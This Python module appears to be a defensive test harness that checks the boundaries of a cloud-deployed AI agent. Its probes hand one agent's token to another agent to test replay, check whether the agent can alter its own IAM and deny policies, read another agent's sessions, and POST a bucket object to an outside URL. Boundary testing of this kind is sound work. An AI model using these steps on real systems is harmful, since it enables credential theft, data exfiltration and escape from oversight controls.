"""v3h probes added 2026-11-12 (plan section 3b): T48b relay, T50 boundary, T51 routes, T52 sessions, T55 exfil.

Every call uses the agent's own credentials. Bound agent tokens are refused on regular hosts (T48 own_nocert 401),
so Google API calls go over an mTLS session to *.mtls.googleapis.com when the session has a client certificate.
Each function returns a small dict: statuses, short error texts, never token material."""

import hashlib
import json
import os
import re
import urllib.error
import urllib.request

import google.auth
import google.auth.transport.requests
import google.oauth2.credentials

TOKEN_RE = re.compile(r"(ya29\.[\w.\-]+|eyJ[\w.\-]{20,}|Bearer\s+[\w.\-]+)")
STALE_ETAG = "BwYAAAAAAAA="  # never a current etag: a caller WITH the permission gets 409 ABORTED, nothing written
PROMPT = "Reply with the single word: ok"
T50_PROJECT_PERMS = [
    "resourcemanager.projects.setIamPolicy",
    "iam.denypolicies.update",
    "iam.denypolicies.delete",
    "aiplatform.reasoningEngines.update",
    "networksecurity.gatewaySecurityPolicies.update",
    "networksecurity.gatewaySecurityPolicyRules.update",
    "networkservices.agentGateways.update",
    "networksecurity.authzPolicies.update",
    "accesscontextmanager.servicePerimeters.update",
    "orgpolicy.policy.set",
]
T50_FOLDER_PERMS = [
    "resourcemanager.folders.setIamPolicy",
    "iam.denypolicies.update",
    "iam.denypolicies.delete",
    "accesscontextmanager.servicePerimeters.update",
    "orgpolicy.policy.set",
]


def _short(text) -> str:
    return TOKEN_RE.sub("[redacted]", str(text or "")).replace("\n", " ")[:300]


def _env(name: str) -> str:
    return os.environ.get(name, "")


def _creds():
    creds, _ = google.auth.default(scopes=["https://www.googleapis.com/auth/cloud-platform"])
    creds.refresh(google.auth.transport.requests.Request())
    return creds


def _session(creds=None, refresh: bool = True) -> tuple:
    """(AuthorizedSession, is_mtls, error). configure_mtls_channel loads the workload's default client certificate.
    refresh=False: never refresh on 401, so the server's answer is returned (T48b v2: a borrowed bare token)."""
    kw = {} if refresh else {"refresh_status_codes": ()}
    sess = google.auth.transport.requests.AuthorizedSession(creds or _creds(), **kw)
    err = ""
    try:
        sess.configure_mtls_channel()
    except Exception as exc:  # noqa: BLE001
        err = _short(f"{exc.__class__.__name__}: {exc}")
    return sess, bool(getattr(sess, "is_mtls", False)), err


def _host(svc: str, mtls: bool) -> str:
    return f"https://{svc}.mtls.googleapis.com" if mtls else f"https://{svc}.googleapis.com"


def _call(sess, method: str, url: str, body=None, timeout: int = 30) -> dict:
    try:
        r = sess.request(method, url, json=body, timeout=timeout)
        out = {"status": r.status_code}
        if r.status_code >= 300:
            try:
                e = r.json().get("error", {})
                out.update(error_status=e.get("status"), error=_short(e.get("message")))
            except ValueError:
                out["error"] = _short(r.text)
        else:
            out["body"] = r.text[:400]
            try:
                j = r.json()
                if isinstance(j, dict) and isinstance(j.get("name"), str):
                    out["json_name"] = j["name"]
            except ValueError:
                pass
        return out
    except Exception as exc:  # noqa: BLE001
        return {"status": None, "error": _short(f"{exc.__class__.__name__}: {exc}")}


def _model_path(loc: str) -> str:
    return f"/v1/projects/{_env('LZV_PROJECT_ID')}/locations/{loc}/publishers/google/models/{_env('LZV_MODEL')}"


def _ai_host(loc: str, mtls: bool) -> str:
    svc = "aiplatform" if loc == "global" else f"{loc}-aiplatform"
    return _host(svc, mtls)


GEN_BODY = {"contents": [{"role": "user", "parts": [{"text": PROMPT}]}]}


# --- T48b: relay (wrong certificate) ---------------------------------------------------------------------
def relay_put(nonce: str) -> dict:
    """Agent X: own mTLS call, then hand its token to the replay service's single-use relay (memory only)."""
    out: dict = {"nonce": nonce}
    creds = _creds()
    token = creds.token
    out["token_sha12"] = hashlib.sha256(token.encode()).hexdigest()[:12]
    sess, mtls, err = _session(creds)
    out.update(own_mtls=mtls, own_mtls_error=err)
    out["own"] = _call(sess, "POST", _ai_host("global", mtls) + _model_path("global") + ":generateContent", GEN_BODY)
    url = _env("LZV_REPLAY_URL").rstrip("/") + "/relay/put"
    try:
        req = urllib.request.Request(url, data=json.dumps({"nonce": nonce, "token": token}).encode(),
                                     headers={"content-type": "application/json"}, method="POST")
        with urllib.request.urlopen(req, timeout=30) as r:  # noqa: S310
            out["put_status"] = r.status
    except urllib.error.HTTPError as exc:
        out["put_status"], out["put_error"] = exc.code, _short(exc.reason)
    except Exception as exc:  # noqa: BLE001
        out["put_status"], out["put_error"] = None, _short(f"{exc.__class__.__name__}: {exc}")
    return out


def relay_take(nonce: str) -> dict:
    """Agent Y: take X's token from the relay and present it over Y's OWN mTLS session; control: Y's own token."""
    out: dict = {"nonce": nonce}
    url = _env("LZV_REPLAY_URL").rstrip("/") + f"/relay/take?nonce={nonce}"
    try:
        with urllib.request.urlopen(url, timeout=30) as r:  # noqa: S310
            xtok = json.loads(r.read().decode()).get("token") or ""
            out["take_status"] = r.status
    except urllib.error.HTTPError as exc:
        out["take_status"], out["take_error"] = exc.code, _short(exc.reason)
        return out
    except Exception as exc:  # noqa: BLE001
        out["take_status"], out["take_error"] = None, _short(f"{exc.__class__.__name__}: {exc}")
        return out
    if not xtok:
        out["take_error"] = "relay returned no token"
        return out
    out["x_token_sha12"] = hashlib.sha256(xtok.encode()).hexdigest()[:12]
    target = _model_path("global") + ":generateContent"
    xs, xm, xerr = _session(google.oauth2.credentials.Credentials(token=xtok), refresh=False)
    out.update(x_over_y_mtls=xm, x_over_y_mtls_error=xerr)
    out["x_over_y"] = _call(xs, "POST", _ai_host("global", xm) + target, GEN_BODY)
    del xtok, xs
    ys, ym, yerr = _session()
    out.update(y_own_mtls=ym, y_own_mtls_error=yerr)
    out["y_own"] = _call(ys, "POST", _ai_host("global", ym) + target, GEN_BODY)
    return out


# --- T50: the agent's own boundary ---------------------------------------------------------------------------
def _relay_get(nonce: str) -> str:
    """Single-use relay read (the operator hands over the current deny policy this way, so it never appears in the
    logged query text)."""
    url = _env("LZV_REPLAY_URL").rstrip("/") + f"/relay/take?nonce={nonce}"
    with urllib.request.urlopen(url, timeout=30) as r:  # noqa: S310
        return json.loads(r.read().decode()).get("token") or ""


def boundary(step: str, project: str, folder: str, engine: str, display: str, deny_nonce: str) -> dict:
    sess, mtls, err = _session()
    out: dict = {"step": step, "mtls": mtls, "mtls_error": err}
    crm = _host("cloudresourcemanager", mtls)
    if step == "perms":
        res = {}
        for p in T50_PROJECT_PERMS:  # one call per permission: an invalid one must not hide the others
            r = _call(sess, "POST", f"{crm}/v1/projects/{project}:testIamPermissions", {"permissions": [p]})
            res[f"project:{p}"] = (p in (json.loads(r.get("body") or "{}").get("permissions") or [])) if r.get("status") == 200 \
                else f"error {r.get('status')}: {r.get('error', '')[:80]}"
        for p in T50_FOLDER_PERMS:
            r = _call(sess, "POST", f"{crm}/v3/folders/{folder}:testIamPermissions", {"permissions": [p]})
            res[f"folder:{p}"] = (p in (json.loads(r.get("body") or "{}").get("permissions") or [])) if r.get("status") == 200 \
                else f"error {r.get('status')}: {r.get('error', '')[:80]}"
        out["perms"] = res
    elif step == "setiam":
        # updateMask=auditConfigs with an empty list: the runtime project has no auditConfigs (checked 2026-11-12),
        # so even with a matching etag nothing would change; the stale etag makes a permitted call fail with 409.
        out["result"] = _call(sess, "POST", f"{crm}/v1/projects/{project}:setIamPolicy",
                              {"policy": {"etag": STALE_ETAG, "auditConfigs": []}, "updateMask": "auditConfigs"})
    elif step == "patch":
        loc = engine.split("/locations/")[1].split("/")[0]
        out["result"] = _call(sess, "PATCH", f"{_ai_host(loc, mtls)}/v1/{engine}?updateMask=displayName", {"displayName": display})
    elif step == "deny":
        try:
            body = json.loads(_relay_get(deny_nonce) or "{}")
        except Exception as exc:  # noqa: BLE001
            out["error"] = _short(f"relay: {exc.__class__.__name__}: {exc}")
            return out
        name = body.get("name", "")
        out["deny_rules"] = len(body.get("rules") or [])
        body["etag"] = STALE_ETAG  # same content, stale etag: a permitted call gets 409, nothing written
        out["result"] = _call(sess, "PUT", f"{_host('iam', mtls)}/v2/{name}", body) if name else {"status": None, "error": "no policy name"}
    else:
        out["error"] = "unknown step"
    return out


# --- T51: model-access routes --------------------------------------------------------------------------------
def routes(region: str, bucket: str) -> dict:
    sess, mtls, err = _session()
    out: dict = {"mtls": mtls, "mtls_error": err, "routes": {}}
    r = out["routes"]
    r["generateContent_global"] = _call(sess, "POST", _ai_host("global", mtls) + _model_path("global") + ":generateContent", GEN_BODY)
    r["generateContent_regional"] = _call(sess, "POST", _ai_host(region, mtls) + _model_path(region) + ":generateContent", GEN_BODY)
    r["streamGenerateContent_global"] = _call(sess, "POST", _ai_host("global", mtls) + _model_path("global") + ":streamGenerateContent?alt=sse", GEN_BODY)
    r["countTokens_global"] = _call(sess, "POST", _ai_host("global", mtls) + _model_path("global") + ":countTokens", GEN_BODY)
    r["chatCompletions_global"] = _call(
        sess, "POST", _ai_host("global", mtls) + f"/v1/projects/{_env('LZV_PROJECT_ID')}/locations/global/endpoints/openapi/chat/completions",
        {"model": f"google/{_env('LZV_MODEL')}", "messages": [{"role": "user", "content": PROMPT}]})
    for k in r:
        r[k].pop("body", None)
        r[k].pop("json_name", None)
    # Batch job: input object does not exist; if the job is created it is cancelled at once (human-approved).
    parent = f"projects/{_env('LZV_PROJECT_ID')}/locations/{region}"
    b = _call(sess, "POST", _ai_host(region, mtls) + f"/v1/{parent}/batchPredictionJobs", {
        "displayName": "lzv-t51-probe",
        "model": f"publishers/google/models/{_env('LZV_MODEL')}",
        "inputConfig": {"instancesFormat": "jsonl", "gcsSource": {"uris": [f"gs://{bucket}/lzv-t51-missing.jsonl"]}},
        "outputConfig": {"predictionsFormat": "jsonl", "gcsDestination": {"outputUriPrefix": f"gs://{bucket}/lzv-t51-out/"}},
    })
    if b.get("status") == 200:
        name = b.get("json_name") or ""
        if not name:
            try:
                name = json.loads(b.get("body") or "{}").get("name", "")
            except ValueError:
                name = ""
        b["created_name_tail"] = name.split("/")[-1] if name else None
        b["cancel"] = _call(sess, "POST", _ai_host(region, mtls) + f"/v1/{name}:cancel", {}) if name else {"status": None}
        b["cancel"].pop("body", None)
        b["cancel"].pop("json_name", None)
    b.pop("body", None)
    b.pop("json_name", None)
    r["batchPredictionJobs_create"] = b
    return out


# --- T52: another agent's sessions and memory ------------------------------------------------------------------
def sessions(engine: str, session_id: str, user_id: str) -> dict:
    sess, mtls, err = _session()
    loc = engine.split("/locations/")[1].split("/")[0]
    h = _ai_host(loc, mtls) + "/v1/" + engine
    out: dict = {"mtls": mtls, "mtls_error": err, "calls": {
        "sessions_list": _call(sess, "GET", f"{h}/sessions?pageSize=5"),
        "sessions_get": _call(sess, "GET", f"{h}/sessions/{session_id}"),
        "memories_list": _call(sess, "GET", f"{h}/memories?pageSize=5"),
        "query_get_session": _call(sess, "POST", f"{h}:query",
                                   {"class_method": "get_session", "input": {"user_id": user_id, "session_id": session_id}}),
    }}
    for v in out["calls"].values():
        body = v.pop("body", None)
        v.pop("json_name", None)
        if body is not None:
            v["body_len"] = len(body)
    return out


# --- T55: in-envelope exfiltration -----------------------------------------------------------------------------
def exfil() -> dict:
    out: dict = {}
    try:
        from google.cloud import storage

        client = storage.Client(project=_env("LZV_PROJECT_ID") or None)
        data = client.bucket(_env("LZV_SRC_BUCKET")).blob(_env("LZV_SRC_OBJECT")).download_as_bytes()
        out.update(read_status=200, size=len(data), sha12=hashlib.sha256(data).hexdigest()[:12])
    except Exception as exc:  # noqa: BLE001
        out.update(read_status=None, read_error=_short(f"{exc.__class__.__name__}: {exc}"))
        return out
    url = _env("LZV_ALLOWED_URL").rstrip("/") + f"/lzv-t55?sha={out['sha12']}"
    try:
        req = urllib.request.Request(url, data=data, headers={"content-type": "application/octet-stream"}, method="POST")
        with urllib.request.urlopen(req, timeout=20) as r:  # noqa: S310 - HTTPS_PROXY (SWP) from the engine env
            out["post_status"] = r.status
    except urllib.error.HTTPError as exc:
        out["post_status"], out["post_error"] = exc.code, _short(exc.reason)
    except Exception as exc:  # noqa: BLE001
        out["post_status"], out["post_error"] = None, _short(f"{exc.__class__.__name__}: {exc}")
    out["proxy_set"] = bool(os.environ.get("HTTPS_PROXY"))
    return out
